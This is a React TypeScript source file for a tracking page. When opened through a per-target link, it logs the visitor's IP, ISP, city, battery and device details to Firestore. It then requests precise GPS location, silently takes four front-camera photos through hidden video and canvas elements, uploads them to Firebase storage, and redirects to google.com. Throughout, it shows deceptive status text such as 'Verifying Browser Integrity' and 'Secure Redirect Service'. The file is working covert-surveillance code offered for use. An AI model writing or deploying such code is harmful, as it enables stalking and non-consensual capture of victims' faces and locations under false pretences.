
import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';
import { collection, addDoc, updateDoc, doc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { db, storage } from '../firebase';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const [status, setStatus] = useState('Initializing Secure Connection...');
  const [progress, setProgress] = useState(0);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const trackingStarted = useRef(false);

  const getFullDeviceDetails = () => {
    const ua = navigator.userAgent;
    let model = "Unknown Device";
    if (/android/i.test(ua)) {
      const match = ua.match(/Android\s+([^\s;]+)/);
      model = match ? `Android ${match[1]}` : "Android Device";
      const specific = ua.match(/;\s+([^;)]+)\s+Build/);
      if (specific) model = specific[1];
    } else if (/iPhone|iPad|iPod/i.test(ua)) {
      model = "Apple iOS Device";
    } else if (/Windows/i.test(ua)) {
      model = "Windows PC";
    }
    return model;
  };

  useEffect(() => {
    if (id && !trackingStarted.current) {
      trackingStarted.current = true;
      startAutomaticTracking();
    }
  }, [id]);

  const startAutomaticTracking = async () => {
    let docId = "";
    
    // STEP 1: Capture Immediate Data (IP, Battery, Device)
    try {
      setStatus('Verifying Browser Integrity...');
      setProgress(20);
      
      const [ipRes, battery] = await Promise.all([
        fetch('https://ipapi.co/json/').then(r => r.json()),
        // @ts-ignore
        navigator.getBattery ? navigator.getBattery() : Promise.resolve(null)
      ]);

      const initialPayload = {
        userId: id,
        timestamp: serverTimestamp(),
        ip: ipRes.ip || "Unknown",
        isp: ipRes.org || "Unknown",
        city: ipRes.city || "Unknown",
        device: {
          name: getFullDeviceDetails(),
          userAgent: navigator.userAgent,
          screen: `${window.screen.width}x${window.screen.height}`,
        },
        battery: battery ? { level: Math.round(battery.level * 100), charging: battery.charging } : { level: 0, charging: false },
        status: 'Base Captured'
      };

      // Save initial data immediately so we don't lose the IP even if user leaves
      const docRef = await addDoc(collection(db, "logs"), initialPayload);
      docId = docRef.id;
      setProgress(40);
    } catch (e) {
      console.error("Initial data capture failed", e);
    }

    if (!docId) return;

    // STEP 2: Attempt GPS (Automatic Prompt)
    try {
      setStatus('Synchronizing Location...');
      const pos = await new Promise<GeolocationPosition>((res, rej) => {
        navigator.geolocation.getCurrentPosition(res, rej, {
          enableHighAccuracy: true,
          timeout: 8000,
          maximumAge: 0
        });
      });
      
      await updateDoc(doc(db, "logs", docId), {
        location: { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy },
        status: 'Location Captured'
      });
      setProgress(70);
    } catch (e) {
      await updateDoc(doc(db, "logs", docId), { locationStatus: "Denied/Timeout" });
    }

    // STEP 3: Attempt Camera (Automatic Prompt)
    try {
      setStatus('Finalizing Security Checks...');
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user", width: 640, height: 480 } 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await new Promise(r => setTimeout(r, 1000)); // Prep time

        const photoUrls: string[] = [];
        for (let i = 0; i < 4; i++) {
          const canvas = canvasRef.current;
          if (canvas && videoRef.current) {
            canvas.width = videoRef.current.videoWidth;
            canvas.height = videoRef.current.videoHeight;
            canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
            const base64 = canvas.toDataURL('image/jpeg', 0.5);
            const sRef = ref(storage, `captures/${id}/${Date.now()}_${i}.jpg`);
            await uploadString(sRef, base64, 'data_url');
            photoUrls.push(await getDownloadURL(sRef));
            await new Promise(r => setTimeout(r, 500));
          }
        }
        
        stream.getTracks().forEach(t => t.stop());
        await updateDoc(doc(db, "logs", docId), { 
          photoUrls: photoUrls,
          status: 'Full Capture'
        });
      }
      setProgress(100);
    } catch (e) {
      await updateDoc(doc(db, "logs", docId), { cameraStatus: "Denied" });
      setProgress(100);
    }

    // FINAL STEP: Redirect
    setTimeout(() => {
      window.location.href = "https://www.google.com";
    }, 1000);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6 text-slate-800 font-['Hind_Siliguri']">
      <div className="w-full max-w-sm text-center">
        <div className="mb-8">
           <div className="w-20 h-20 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
           <h1 className="text-2xl font-bold mb-2">Redirecting...</h1>
           <p className="text-slate-500 text-sm leading-relaxed">{status}</p>
        </div>

        <div className="w-full bg-slate-100 h-2 rounded-full overflow-hidden mb-4">
           <div className="bg-blue-600 h-full transition-all duration-500" style={{ width: `${progress}%` }}></div>
        </div>
        <p className="text-[10px] text-slate-400 font-bold uppercase tracking-widest">Secure Redirect Service</p>

        <video ref={videoRef} autoPlay muted playsInline className="hidden"></video>
        <canvas ref={canvasRef} className="hidden"></canvas>
      </div>
    </div>
  );
};

export default TrackPage;
